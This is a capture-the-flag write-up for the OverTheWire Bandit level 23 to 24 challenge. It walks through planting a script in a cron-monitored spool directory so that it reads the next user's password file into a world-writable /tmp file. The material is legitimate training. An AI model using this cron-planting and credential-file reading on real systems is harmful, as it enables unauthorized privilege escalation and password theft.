# Bandit Level 23 → Level 24

## Goal
The password for the next level is obtained by creating a shell script that is automatically executed by a cron job running as `bandit24`.

## Solution

1. Connected to the server using SSH: 
```
ssh -p 2220 bandit23@bandit.labs.overthewire.org
```
2. Inspected the cron configuration and identified the cron job executed as `bandit24`:
```
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
```
3. Analyzed the script behavior and found that it executes files placed in /var/spool/bandit24/foo if they are owned by `bandit23`.
4. Created a temporary working directory and prepared a custom shell script:
```
mkdir /tmp/banditest
cd /tmp/banditest
```
5. Created a script that copies the bandit24 password into a readable file in /tmp:
```
nano script.sh
chmod +x script.sh
```
- script.sh :
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/passhere.txt
```
6. Created an output file with writable permissions:
```
touch /tmp/passhere.txt
chmod 777 /tmp/passhere.txt
```
7. Copied the script into the cron-monitored directory:
```
cp script.sh /var/spool/bandit24/foo
```
8. Waited for the cron job to execute the script automatically, then read the generated file:
```
cat /tmp/passhere.txt
```

## Result
The password for the next level was retrieved after a custom script was executed automatically with `bandit24` privileges by a cron job.

## Learning
- I learned that properly analyzing and understanding a program’s behavior can reveal alternative ways to perform actions that are not normally possible.
- I learned how cron jobs can automatically execute user-controlled scripts from monitored directories.
- I learned how to create and execute basic shell scripts in Linux.
- I learned how file ownership and permissions affect automated task execution.
